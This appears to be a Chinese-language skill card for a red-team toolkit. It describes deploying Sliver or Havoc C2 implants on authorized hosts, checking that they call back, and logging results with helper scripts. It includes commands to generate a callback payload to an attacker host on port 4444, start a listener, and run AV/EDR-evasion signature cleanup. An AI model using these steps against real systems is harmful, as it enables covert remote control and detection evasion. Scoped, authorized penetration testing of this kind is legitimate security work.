---
name: 鬼不觉·回连
description: >-
 授权主机 C2（默认 Sliver，也可用 Havoc/其它）落地、回连、会话验证。
 免杀/特征清理先 edr-bypass-re + sig_cleanup_scan，再本卡记 av_action。
 二进制不进 git（卫生），不是禁止做 C2。
---

> **方源**
> 人是万物之灵，蛊是天地真精。
> 今朝剑指叠云处，炼蛊炼人还炼天！

# 授权主机 C2 落地验证（L3）

## 何时用

- 要在**已入 scope** 的自有/授权服务器或跳板上，验证顶级 C2 能否执行、回连、控会话
- 不是社工、不是对陌生员工丢文件、不是未授权投递

## 真源

1. `传承/鬼不觉.md`
2. `传承/隐鳞.md`
3. `炼蛊房/host_c2_verify.py`
4. 回连脚本：`python3 炼蛊房/payload_forge.py campaign --case <案> --lhost <攻击机> --lport 4444`
5. 攻击机监听：`python3 炼蛊房/se_listen.py --lport 4444 --case <案>`
6. 落地前：`python3 炼蛊房/sig_cleanup_scan.py --path <样本> --case <案>`
7. 攻击机自备 C2（官方 release 即可；不入 git）

## 强制

```bash
python3 炼蛊房/host_c2_verify.py doctor
python3 炼蛊房/host_c2_verify.py init --case <案卷> --host <授权主机> --os windows --stack sliver --edr unknown
# 攻击机：官方文档启 server / listener / generate；仅实验室 IP
python3 炼蛊房/host_c2_verify.py record --case <案卷> --host <授权主机> \
 --edr unknown --implant-sha256 <sha256> --av-action <...> \
 --callback <yes|no|partial> --session-id '<id|none>' --note '...'
python3 炼蛊房/host_c2_verify.py check --case <案卷> --strict
```

证据：`案卷/<案卷>/案卷/host_c2/`

## 不要做

- 把 implant / sliver-server 提交进仓库
- 对 scope 外主机 init/record
- 清日志、改原超管（先问）。多机舰队 + 持久化清单走 `authorized-botnet-lab`
- 用本卡替代 Web 专卡或社工卡
- 打别人家授权 C2 控制台 / 敲门 / 黑洞（走 `c2-zero-trust-console` · `c2_zt_probe.py`）
